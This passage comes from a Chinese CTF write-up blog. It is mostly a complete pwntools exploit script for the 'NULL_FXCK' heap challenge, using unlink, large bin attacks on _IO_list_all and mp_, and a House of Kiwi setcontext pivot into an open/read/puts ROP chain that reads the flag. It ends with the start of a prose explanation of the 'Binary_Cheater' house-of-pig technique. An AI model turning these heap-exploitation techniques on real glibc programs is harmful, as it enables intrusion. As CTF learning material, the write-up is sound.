punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nl32 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\xf7'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsla <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsa  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nlg  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> name<span class=\"token punctuation\">,</span>data  <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span>name <span class=\"token operator\">+</span> <span class=\"token string\">': 0x%x'</span> <span class=\"token operator\">%</span> data<span class=\"token punctuation\">)</span>\nse  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nrl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nsl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nru  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a          <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nrint<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> x <span class=\"token operator\">=</span> <span class=\"token number\">12</span>     <span class=\"token punctuation\">:</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">dbg</span><span class=\"token punctuation\">(</span> b <span class=\"token operator\">=</span> null<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>b <span class=\"token operator\">==</span> null<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span>\n        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span><span class=\"token string\">'b %s'</span><span class=\"token operator\">%</span>b<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">one_gadget</span><span class=\"token punctuation\">(</span>filename<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    log<span class=\"token punctuation\">.</span>progress<span class=\"token punctuation\">(</span><span class=\"token string\">'Leak One_Gadgets...'</span><span class=\"token punctuation\">)</span>\n    one_ggs <span class=\"token operator\">=</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>subprocess<span class=\"token punctuation\">.</span>check_output<span class=\"token punctuation\">(</span>\n        <span class=\"token punctuation\">[</span><span class=\"token string\">'one_gadget'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'--raw'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'-f'</span><span class=\"token punctuation\">,</span>filename<span class=\"token punctuation\">]</span>\n    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">' '</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> <span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">map</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">,</span>one_ggs<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">cmd</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'>>'</span><span class=\"token punctuation\">,</span>num<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span>size <span class=\"token punctuation\">,</span> Content <span class=\"token operator\">=</span> <span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'Size: '</span> <span class=\"token punctuation\">,</span> size<span class=\"token punctuation\">)</span>\n    sa<span class=\"token punctuation\">(</span><span class=\"token string\">'Content:'</span> <span class=\"token punctuation\">,</span> Content<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span>idx <span class=\"token punctuation\">,</span> Content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'Index: '</span> <span class=\"token punctuation\">,</span> idx<span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'Content:'</span> <span class=\"token punctuation\">,</span> Content<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">delete</span><span class=\"token punctuation\">(</span>idx <span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'Index: '</span> <span class=\"token punctuation\">,</span> idx<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">show</span><span class=\"token punctuation\">(</span>idx <span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'Index: '</span> <span class=\"token punctuation\">,</span> idx<span class=\"token punctuation\">)</span>\n\n\n<span class=\"token comment\"># one_gad = one_gadget(libc.path)</span>\n<span class=\"token comment\"># 本质是通过 unsorted bin 或者 large bin 的指针残留构造 unlink 的指针指向</span>\n\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x418</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x108</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x418</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#2</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x438</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#3</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x208</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#4</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x428</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#5</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x418</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#6</span>\n\ndelete<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\ndelete<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\ndelete<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span>\n\ndelete<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># unsorted bin 合并 ，但合并不会清空数据，某处有残留的堆地址</span>\n\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x438</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span> <span class=\"token operator\">*</span> <span class=\"token number\">0x418</span> <span class=\"token operator\">+</span>  p64<span class=\"token punctuation\">(</span> <span class=\"token number\">0x420</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x210</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x430</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x420</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x20</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#0</span>\n\n<span class=\"token comment\"># 0xa91 写到了原来 chunk3 的 size 处，刚好这下面有残留的堆地址</span>\n<span class=\"token comment\"># 切割已经合并的大块</span>\n<span class=\"token comment\"># unsorted bin 从新到旧排序</span>\n\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x418</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#2</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x428</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#3</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x418</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#5</span>\n\n<span class=\"token comment\"># 下面构造 fack fd </span>\ndelete<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span>\ndelete<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x418</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">9</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#2</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x418</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#5</span>\n\n<span class=\"token comment\"># 下面构造 fack bk</span>\n\ndelete<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span>\ndelete<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\n\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x9f8</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#3</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x428</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#5</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x418</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#7</span>\n\n<span class=\"token comment\"># 下面进行 unlink</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x408</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x411</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#8</span>\nedit<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span> <span class=\"token operator\">*</span> <span class=\"token number\">0x410</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x210</span> <span class=\"token operator\">+</span><span class=\"token number\">0x430</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x420</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x420</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x20</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\ndelete<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\n\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x438</span> <span class=\"token punctuation\">,</span> flat<span class=\"token punctuation\">(</span><span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">,</span><span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x421</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#3</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x1600</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#9</span>\n\nshow<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span>\n__malloc_hook <span class=\"token operator\">=</span> l64<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">1644</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x40</span> <span class=\"token operator\">-</span> <span class=\"token number\">4</span>\nlibc<span class=\"token punctuation\">.</span>address <span class=\"token operator\">=</span> __malloc_hook <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">]</span>\n_environ <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'_environ'</span><span class=\"token punctuation\">]</span>\nmp_ <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>address <span class=\"token operator\">+</span> <span class=\"token number\">0x1e3280</span>\n_IO_list_all <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'_IO_list_all'</span><span class=\"token punctuation\">]</span>\n_IO_str_jumps <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>address <span class=\"token operator\">+</span> <span class=\"token number\">0x1e5580</span>\n_IO_file_jumps <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>address <span class=\"token operator\">+</span> <span class=\"token number\">0x1e54c0</span>\n_IO_helper_jumps <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>address <span class=\"token operator\">+</span> <span class=\"token number\">0x1e48c0</span>\nsetcontext <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'setcontext'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">61</span>\n\nshow<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span>\nheap_base <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span> <span class=\"token number\">8</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x2b0</span>\n\nptr_list <span class=\"token operator\">=</span> <span class=\"token number\">0x4160</span>\nlg<span class=\"token punctuation\">(</span><span class=\"token string\">'__malloc_hook'</span> <span class=\"token punctuation\">,</span> __malloc_hook<span class=\"token punctuation\">)</span>\nlg<span class=\"token punctuation\">(</span><span class=\"token string\">'heap_base'</span><span class=\"token punctuation\">,</span>heap_base<span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># ptr_list = $rebase(0x000000000004160)</span>\n\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x1458</span> <span class=\"token punctuation\">,</span> flat<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">0x208</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x431</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">0x428</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x421</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">0x418</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0xa01</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n\ndelete<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span>\ndelete<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span>\n\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x1458</span>  <span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x448</span><span class=\"token punctuation\">)</span>\n\ndelete<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x1458</span> <span class=\"token punctuation\">,</span> flat<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">0x208</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x431</span> <span class=\"token punctuation\">,</span> __malloc_hook <span class=\"token operator\">+</span> <span class=\"token number\">0x460</span><span class=\"token punctuation\">,</span>__malloc_hook <span class=\"token operator\">+</span> <span class=\"token number\">0x460</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> _IO_list_all <span class=\"token operator\">-</span> <span class=\"token number\">0x20</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n\ndelete<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x448</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x418</span><span class=\"token punctuation\">)</span>\n\ndelete<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x438</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">0x2c0</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>_IO_file_jumps <span class=\"token operator\">+</span> <span class=\"token number\">96</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">0x98</span> <span class=\"token operator\">+</span> flat<span class=\"token punctuation\">(</span>_IO_helper_jumps <span class=\"token operator\">+</span> <span class=\"token number\">0xa0</span> <span class=\"token punctuation\">,</span> heap_base <span class=\"token operator\">+</span> <span class=\"token number\">0x4bb0</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span> <span class=\"token comment\">#设置 entry</span>\n\ndelete<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x1458</span> <span class=\"token punctuation\">,</span> flat<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">0x208</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x431</span> <span class=\"token punctuation\">,</span> __malloc_hook <span class=\"token operator\">+</span> <span class=\"token number\">0x460</span><span class=\"token punctuation\">,</span>__malloc_hook <span class=\"token operator\">+</span> <span class=\"token number\">0x460</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> mp_ <span class=\"token operator\">+</span> <span class=\"token number\">80</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x20</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\ndelete<span class=\"token punctuation\">(</span><span class=\"token number\">11</span><span class=\"token punctuation\">)</span>\n\n\nread_addr <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'read'</span><span class=\"token punctuation\">]</span>\nopen_addr <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'open'</span><span class=\"token punctuation\">]</span>\nputs_addr <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span>\nleave_ret <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span>asm<span class=\"token punctuation\">(</span><span class=\"token string\">'leave;ret'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\npop_rax_ret <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span>asm<span class=\"token punctuation\">(</span><span class=\"token string\">'pop rax; ret'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\npop_rdi_ret <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span>asm<span class=\"token punctuation\">(</span><span class=\"token string\">'pop rdi; ret'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\npop_rsi_ret <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span>asm<span class=\"token punctuation\">(</span><span class=\"token string\">'pop rsi; ret'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\npop_rdx_pop_rbx_ret <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span>asm<span class=\"token punctuation\">(</span><span class=\"token string\">'pop rdx ; pop rbx ; ret'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nret <span class=\"token operator\">=</span> pop_rdi_ret <span class=\"token operator\">+</span> <span class=\"token number\">1</span>\n\nflag_addr <span class=\"token operator\">=</span> heap_base <span class=\"token operator\">+</span> <span class=\"token number\">0x4770</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x100</span>\nchain <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span>\n    pop_rdi_ret <span class=\"token punctuation\">,</span> flag_addr <span class=\"token punctuation\">,</span> pop_rsi_ret <span class=\"token punctuation\">,</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> open_addr<span class=\"token punctuation\">,</span>\n    pop_rdi_ret <span class=\"token punctuation\">,</span> <span class=\"token number\">3</span> <span class=\"token punctuation\">,</span> pop_rsi_ret <span class=\"token punctuation\">,</span> flag_addr <span class=\"token punctuation\">,</span> pop_rdx_pop_rbx_ret <span class=\"token punctuation\">,</span> <span class=\"token number\">0x100</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> read_addr<span class=\"token punctuation\">,</span>\n    pop_rdi_ret <span class=\"token punctuation\">,</span> flag_addr <span class=\"token punctuation\">,</span> puts_addr\n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">'flag\\x00'</span>\n<span class=\"token comment\"># len chain 0x80</span>\n\n<span class=\"token comment\"># dbg()</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x448</span> <span class=\"token punctuation\">,</span> chain<span class=\"token punctuation\">)</span> <span class=\"token comment\"># copy</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x418</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># House of kiwi 三大条件</span>\n\n\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x1450</span> <span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>setcontext<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x1590</span> <span class=\"token punctuation\">,</span> flat<span class=\"token punctuation\">(</span> heap_base <span class=\"token operator\">+</span> <span class=\"token number\">0x4770</span> <span class=\"token punctuation\">,</span> ret <span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x15a0</span> <span class=\"token punctuation\">,</span> flat<span class=\"token punctuation\">(</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x3e0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 0x1450 0x1590 0x15a0</span>\n<span class=\"token comment\"># dbg()</span>\n\n<span class=\"token comment\"># dbg()</span>\ncmd<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\nsla<span class=\"token punctuation\">(</span><span class=\"token string\">'Size'</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x1000</span><span class=\"token punctuation\">)</span>\n\np<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\n@File    :   NULL_FXCK.py\n@Time    :   2021/09/26 13:47:40\n@Author  :   Niyah\n'''</span></code></pre>\n<h1 id=\"binary_cheater\"><a class=\"markdownIt-Anchor\" href=\"#binary_cheater\">#</a> Binary_Cheater</h1>\n<p>libc-2.32 下的题目，漏洞是个 Uaf ， 但是堆块只能申请  Large Chunk 范围内的堆块</p>\n<p>注意本题使用的是 calloc 来申请内存，不会从 tcache 里取，所以 NULL_FXCK 中的利用方法失效</p>\n<p>这题做得特累，前前后后参照了 wjh 师傅好几篇博客才完成，特别感谢 wjh 师傅，其中 exp 跟 wjh 师傅的大同小异，其实也就一个 gadget 和 wjh 师傅的不一样</p>\n<h2 id=\"地址泄露-2\"><a class=\"markdownIt-Anchor\" href=\"#地址泄露-2\">#</a> 地址泄露</h2>\n<p>首先是泄露问题，本题增删改查都有，uaf 的泄露有手就行，直接可以得到 libc 地址和 堆基址</p>\n<h2 id=\"漏洞利用-2\"><a class=\"markdownIt-Anchor\" href=\"#漏洞利用-2\">#</a> 漏洞利用</h2>\n<ol>\n<li>本题不能直接 getshell ，需要使用 open read write 读出 flag，如果没有 对 free_hook 和 malloc_hooc 的检查，我们是可以先用 large bin attack 攻击 mp_.tcache_bins ，之后直接 tcache attack 攻击__free_hook 的，但是本题难在有检测，那么如何利用呢？</li>\n<li>这就要开始介绍一下 house of pig 了，在执行 io_str_overflow 函数时会连续调用 malloc memcpy free 操作，而关于这个函数的参数控制，我们可以通过 large bin attack 攻击向一个 io file 指针写入一个我们可控的堆地址，之后再将这个堆块伪造成 io file 结构体。</li>\n<li>关于调用流程的 malloc 函数，该参数可以通过 io file 结构体的_IO_buf_end  和 _IO_buf_base 得到，这个参数我们还是可以在伪造 io file 的时候控制</li>\n<li>关于调用流程的 memcpy 函数，该函数会把 原来_IO_buf_base 和 _IO_buf_end  之间的数据拷贝到之前 malloc 的内存中</li>\n<li>关于调用流程的 free 